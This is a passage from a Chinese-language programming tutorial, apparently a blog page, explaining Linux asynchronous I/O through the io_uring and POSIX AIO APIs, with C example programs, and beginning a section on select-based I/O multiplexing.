<li><p><strong>初始化 <code>io_uring</code></strong>:</p>
<ul>
<li>使用 <code>io_uring_queue_init</code> 初始化一个 <code>io_uring</code> 实例。</li>
</ul>
</li>
<li><p><strong>准备 I&#x2F;O 请求</strong>:</p>
<ul>
<li>获取提交队列条目（SQE），并设置请求的详细信息（例如，读、写操作的文件描述符、缓冲区和长度）。</li>
</ul>
</li>
<li><p><strong>提交请求</strong>:</p>
<ul>
<li>将准备好的请求提交到提交队列。</li>
</ul>
</li>
<li><p><strong>等待和处理完成</strong>:</p>
<ul>
<li>使用 <code>io_uring_wait_cqe</code> 或 <code>io_uring_peek_cqe</code> 等函数等待操作完成，并处理完成队列条目（CQE）。</li>
</ul>
</li>
<li><p><strong>清理资源</strong>:</p>
<ul>
<li>使用 <code>io_uring_queue_exit</code> 释放 <code>io_uring</code> 资源。</li>
</ul>
</li>
</ol>
<p><code>io_uring</code> 提供了一组函数用于初始化、提交和处理异步 I&#x2F;O 请求。这些函数在 <code>liburing</code> 库中定义，下面是一些关键函数的详细介绍：</p>
<h3 id="初始化和清理"><a href="#初始化和清理" class="headerlink" title="初始化和清理"></a>初始化和清理</h3><ul>
<li><p><strong><code>io_uring_queue_init</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags);</code></li>
<li><strong>功能</strong>: 初始化一个 <code>io_uring</code> 实例。</li>
<li><strong>参数</strong>:<ul>
<li><code>entries</code>: 提交队列和完成队列的最大条目数。</li>
<li><code>ring</code>: 指向 <code>io_uring</code> 结构体的指针。</li>
<li><code>flags</code>: 初始化标志，通常为 0。</li>
</ul>
</li>
<li><strong>返回值</strong>: 成功返回 0，失败返回负错误码。</li>
</ul>
</li>
<li><p><strong><code>io_uring_queue_exit</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>void io_uring_queue_exit(struct io_uring *ring);</code></li>
<li><strong>功能</strong>: 释放 <code>io_uring</code> 实例的资源。</li>
<li><strong>参数</strong>:<ul>
<li><code>ring</code>: 指向要释放的 <code>io_uring</code> 结构体的指针。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="提交请求"><a href="#提交请求" class="headerlink" title="提交请求"></a>提交请求</h3><ul>
<li><p><strong><code>io_uring_get_sqe</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring);</code></li>
<li><strong>功能</strong>: 获取一个提交队列条目（SQE）。</li>
<li><strong>参数</strong>:<ul>
<li><code>ring</code>: 指向 <code>io_uring</code> 结构体的指针。</li>
</ul>
</li>
<li><strong>返回值</strong>: 返回指向 <code>io_uring_sqe</code> 的指针，如果没有可用条目，则返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><strong><code>io_uring_submit</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>int io_uring_submit(struct io_uring *ring);</code></li>
<li><strong>功能</strong>: 将准备好的请求提交到内核。</li>
<li><strong>参数</strong>:<ul>
<li><code>ring</code>: 指向 <code>io_uring</code> 结构体的指针。</li>
</ul>
</li>
<li><strong>返回值</strong>: 成功返回提交的请求数，失败返回负错误码。</li>
</ul>
</li>
</ul>
<h3 id="操作请求"><a href="#操作请求" class="headerlink" title="操作请求"></a>操作请求</h3><p><code>io_uring</code> 提供了一系列函数用于准备不同类型的 I&#x2F;O 操作请求。这些函数会填充 <code>io_uring_sqe</code> 结构体。</p>
<ul>
<li><p><strong><code>io_uring_prep_read</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset);</code></li>
<li><strong>功能</strong>: 准备一个文件读取请求。</li>
<li><strong>参数</strong>:<ul>
<li><code>sqe</code>: 指向要填充的 <code>io_uring_sqe</code> 结构体。</li>
<li><code>fd</code>: 文件描述符。</li>
<li><code>buf</code>: 数据缓冲区。</li>
<li><code>nbytes</code>: 要读取的字节数。</li>
<li><code>offset</code>: 文件偏移量。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>io_uring_prep_write</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset);</code></li>
<li><strong>功能</strong>: 准备一个文件写入请求。</li>
<li><strong>参数</strong>: 与 <code>io_uring_prep_read</code> 类似。</li>
</ul>
</li>
</ul>
<h3 id="完成请求处理"><a href="#完成请求处理" class="headerlink" title="完成请求处理"></a>完成请求处理</h3><ul>
<li><p><strong><code>io_uring_wait_cqe</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe_ptr);</code></li>
<li><strong>功能</strong>: 等待一个完成队列条目（CQE）可用。</li>
<li><strong>参数</strong>:<ul>
<li><code>ring</code>: 指向 <code>io_uring</code> 结构体的指针。</li>
<li><code>cqe_ptr</code>: 指向 <code>io_uring_cqe</code> 指针的指针，用于返回完成的条目。</li>
</ul>
</li>
<li><strong>返回值</strong>: 成功返回 0，失败返回负错误码。</li>
</ul>
</li>
<li><p><strong><code>io_uring_peek_cqe</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe_ptr);</code></li>
<li><strong>功能</strong>: 检查是否有完成队列条目可用，而不阻塞。</li>
<li><strong>参数</strong>: 与 <code>io_uring_wait_cqe</code> 类似。</li>
</ul>
</li>
<li><p><strong><code>io_uring_cqe_seen</code></strong>:</p>
<ul>
<li><strong>原型</strong>: <code>void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe);</code></li>
<li><strong>功能</strong>: 标记完成队列条目为已处理。</li>
<li><strong>参数</strong>:<ul>
<li><code>ring</code>: 指向 <code>io_uring</code> 结构体的指针。</li>
<li><code>cqe</code>: 指向已处理的 <code>io_uring_cqe</code> 的指针。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><strong>异步操作</strong>: <code>io_uring</code> 提供了高效的异步 I&#x2F;O操作，减少了系统调用和上下文切换。</li>
<li><strong>易用性</strong>: 通过简单的 API 和数据结构，用户可以轻松实现异步 I&#x2F;O。</li>
<li><strong>性能优势</strong>: 通过环形缓冲区和最小化内核交互，提供了更高的性能和可扩展性。</li>
</ul>
<p>这些函数组成了 <code>io_uring</code> 的核心 API，帮助开发者实现高效的异步 I&#x2F;O操作。通过掌握这些函数的使用，可以充分发挥 <code>io_uring</code> 的优势。</p>
<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>以下是一个简单的 <code>io_uring</code> 示例，演示如何使用它来进行异步读取操作：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCK_SIZE  4096</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BLOCK_SIZE];</span><br><span class="line">    <span class="type">int</span> ret, fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    fd = open(<span class="string">&quot;example.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 io_uring</span></span><br><span class="line">    ret = io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取一个提交队列条目</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;io_uring_get_sqe failed\n&quot;</span>);</span><br><span class="line">        io_uring_queue_exit(&amp;ring);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备读取请求</span></span><br><span class="line">    io_uring_prep_read(sqe, fd, buffer, BLOCK_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        io_uring_queue_exit(&amp;ring);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待请求完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        io_uring_queue_exit(&amp;ring);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查请求结果</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Async read failed: %s\n&quot;</span>, strerror(-cqe-&gt;res));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Read %d bytes: %.*s\n&quot;</span>, cqe-&gt;res, cqe-&gt;res, buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 完成队列条目处理完成</span></span><br><span class="line">    io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><strong>性能优势</strong>: <code>io_uring</code> 通过减少系统调用和上下文切换，提高了 I&#x2F;O 操作的性能。</li>
<li><strong>灵活性</strong>: 支持多种 I&#x2F;O 操作，包括文件读写、网络 I&#x2F;O 等。</li>
<li><strong>易用性</strong>: 提供了相对简单的 API，易于集成到现有应用中。</li>
</ul>
<p><code>io_uring</code> 是一个强大的工具，适用于需要高性能 I&#x2F;O 操作的应用程序，如数据库、网络服务器等。通过理解其工作原理和使用方法，可以有效地利用其优势。</p>
<h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><p>POSIX异步I&#x2F;O（Asynchronous I&#x2F;O）接口提供了一种在不阻塞应用程序的情况下执行I&#x2F;O操作的方法。这允许程序在等待I&#x2F;O操作完成的同时继续执行其他任务，从而提高应用程序的效率和响应性。POSIX异步I&#x2F;O接口通常用于需要高性能I&#x2F;O操作的应用程序，如网络服务器和数据库系统。</p>
<h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>POSIX异步I&#x2F;O接口主要包括以下几个核心概念和函数：</p>
<ol>
<li><p><strong><code>aiocb</code>结构</strong>：用于描述异步I&#x2F;O操作的控制块。它包含了文件描述符、缓冲区指针、操作偏移量等信息。</p>
</li>
<li><p><strong>异步I&#x2F;O操作函数</strong>：</p>
<ul>
<li><code>aio_read</code>: 发起异步读操作。</li>
<li><code>aio_write</code>: 发起异步写操作。</li>
<li><code>aio_fsync</code>: 发起异步文件同步操作。</li>
</ul>
</li>
<li><p><strong>状态查询函数</strong>：</p>
<ul>
<li><code>aio_error</code>: 查询异步I&#x2F;O操作的状态。</li>
<li><code>aio_return</code>: 获取异步I&#x2F;O操作的返回状态。</li>
</ul>
</li>
<li><p><strong>取消和等待函数</strong>：</p>
<ul>
<li><code>aio_cancel</code>: 取消异步I&#x2F;O操作。</li>
<li><code>aio_suspend</code>: 等待一个或多个异步I&#x2F;O操作完成。</li>
</ul>
</li>
</ol>
<h3 id="aiocb-结构"><a href="#aiocb-结构" class="headerlink" title="aiocb 结构"></a><code>aiocb</code> 结构</h3><p><code>aiocb</code>是一个结构体，用于描述异步I&#x2F;O操作。其定义通常如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aiocb</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> aio_fildes;           <span class="comment">// 文件描述符</span></span><br><span class="line">    <span class="type">off_t</span> aio_offset;         <span class="comment">// 文件偏移量</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">void</span> *aio_buf;   <span class="comment">// 数据缓冲区</span></span><br><span class="line">    <span class="type">size_t</span> aio_nbytes;        <span class="comment">// 操作字节数</span></span><br><span class="line">    <span class="type">int</span> aio_reqprio;          <span class="comment">// 请求优先级</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">aio_sigevent</span>;</span> <span class="comment">// 信号事件</span></span><br><span class="line">    <span class="type">int</span> aio_lio_opcode;       <span class="comment">// 操作码</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="异步I-O操作函数"><a href="#异步I-O操作函数" class="headerlink" title="异步I&#x2F;O操作函数"></a>异步I&#x2F;O操作函数</h3><h4 id="aio-read"><a href="#aio-read" class="headerlink" title="aio_read"></a><code>aio_read</code></h4><p>用于发起异步读操作：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">aio_read</span><span class="params">(<span class="keyword">struct</span> aiocb *aiocbp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数</strong>：指向<code>aiocb</code>结构的指针，描述要执行的读操作。</li>
<li><strong>返回值</strong>：成功返回0，失败返回-1并设置<code>errno</code>。</li>
</ul>
<h4 id="aio-write"><a href="#aio-write" class="headerlink" title="aio_write"></a><code>aio_write</code></h4><p>用于发起异步写操作：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">aio_write</span><span class="params">(<span class="keyword">struct</span> aiocb *aiocbp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数</strong>：指向<code>aiocb</code>结构的指针，描述要执行的写操作。</li>
<li><strong>返回值</strong>：成功返回0，失败返回-1并设置<code>errno</code>。</li>
</ul>
<h3 id="状态查询函数"><a href="#状态查询函数" class="headerlink" title="状态查询函数"></a>状态查询函数</h3><h4 id="aio-error"><a href="#aio-error" class="headerlink" title="aio_error"></a><code>aio_error</code></h4><p>用于查询异步I&#x2F;O操作的状态：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">aio_error</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> aiocb *aiocbp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数</strong>：指向<code>aiocb</code>结构的指针。</li>
<li><strong>返回值</strong>：返回操作的状态。如果操作正在进行，返回<code>EINPROGRESS</code>；如果成功完成，返回0；如果失败，返回错误代码。</li>
</ul>
<h4 id="aio-return"><a href="#aio-return" class="headerlink" title="aio_return"></a><code>aio_return</code></h4><p>用于获取异步I&#x2F;O操作的返回状态：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">aio_return</span><span class="params">(<span class="keyword">struct</span> aiocb *aiocbp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数</strong>：指向<code>aiocb</code>结构的指针。</li>
<li><strong>返回值</strong>：返回操作的结果字节数；如果失败，返回-1。</li>
</ul>
<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><p>以下是一个使用POSIX异步I&#x2F;O进行异步读操作的简单示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;aio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;test.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">aiocb</span> <span class="title">cb</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;cb, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> aiocb));</span><br><span class="line">    cb.aio_fildes = fd;</span><br><span class="line">    cb.aio_buf = buffer;</span><br><span class="line">    cb.aio_nbytes = BUFFER_SIZE;</span><br><span class="line">    cb.aio_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (aio_read(&amp;cb) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;aio_read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待读取完成</span></span><br><span class="line">    <span class="keyword">while</span> (aio_error(&amp;cb) == EINPROGRESS) &#123;</span><br><span class="line">        <span class="comment">// 可以在这里执行其他任务</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num_bytes = aio_return(&amp;cb);</span><br><span class="line">    <span class="keyword">if</span> (num_bytes == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;aio_return&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Read %d bytes: %s\n&quot;</span>, num_bytes, buffer);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>POSIX异步I&#x2F;O接口提供了一种高效的方式来执行非阻塞I&#x2F;O操作。通过<code>aiocb</code>结构和相关函数，程序可以发起异步读写操作，并在操作完成后查询结果。这种机制特别适合需要处理大量并发I&#x2F;O请求的应用程序，如网络服务器和数据库系统。</p>
<h2 id="I-O-多路复用"><a href="#I-O-多路复用" class="headerlink" title="I&#x2F;O 多路复用"></a>I&#x2F;O 多路复用</h2><p>在 Linux 中，I&#x2F;O 多路复用是一种高效的机制，用于同时监视多个文件描述符，以便在任何一个文件描述符变为可读、可写或发生错误时进行相应的处理。I&#x2F;O 多路复用在网络编程中尤为重要，因为它允许单个线程或进程同时处理多个网络连接。Linux 提供了几种实现 I&#x2F;O 多路复用的系统调用，主要包括 <code>select</code>、<code>poll</code> 和 <code>epoll</code>。</p>
<h3 id="select"><a href="#select" class="headerlink" title="select"></a><code>select</code></h3><p><code>select</code> 是最早的 I&#x2F;O 多路复用机制，适用于监视一组文件描述符。</p>
<h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li><code>nfds</code>: 需要监视的文件描述符数量，通常是所有文件描述符中最大值加一。</li>
<li><code>readfds</code>: 指向 <code>fd_set</code> 的指针，用于监视可读事件。</li>
<li><code>writefds</code>: 指向 <code>fd_set</code> 的指针，用于监视可写事件。</li>
<li><code>exceptfds</code>: 指向 <code>fd_set</code> 的指针，用于监视异常事件。</li>
<li><code>timeout</code>: 指定超时时间，<code>NULL</code> 表示无限等待。</li>
</ul>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><ul>
<li>成功时返回就绪的文件描述符数量。</li>
<li>失败时返回 <code>-1</code>，并设置 <code>errno</code>。</li>
</ul>
<h4 id="使用步骤-1"><a href="#使用步骤-1" class="headerlink" title="使用步骤"></a>使用步骤</h4><ol>
<li>初始化 <code>fd_set</code> 结构。</li>
<li>使用 <code>FD_SET</code> 宏将文件描述符添加到 <code>fd_set</code>。</li>
<li>调用 <code>select</code>。</li>
<li>使用 <code>FD_ISSET</code> 宏检查哪些文件描述符已就绪。</li>
</ol>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fd_set readfds;</span><br><span class="line">FD_ZERO(&amp;readfds);</span><br><span class="line">FD_SET(sockfd, &amp;readfds);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">timeout.tv_sec = <span class="number">5</span>;</span><br><span class="line">timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = select(sockfd + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (FD_ISSET(sockfd, &amp;readfds)) &#123;</span><br><span class="line">        <span class="comment">// 处理可读事件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在使用 <code>select</code> 函数进行 I&#x2F;O 多路复用时，<code>fd_set</code> 结构用于表示一组文件描述符。为了操作 <code>fd_set</code>，POSIX 提供了一组宏：<code>FD_CLR</code>、<code>FD_ISSET</code>、<code>FD_SET</code> 和 <code>FD_ZERO</code>。这些宏用于管理和检查文件描述符集合。</p>
<p><strong><code>FD_CLR</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>功能</strong>: 从文件描述符集合中移除指定的文件描述符。</li>
<li><strong>参数</strong>:<ul>
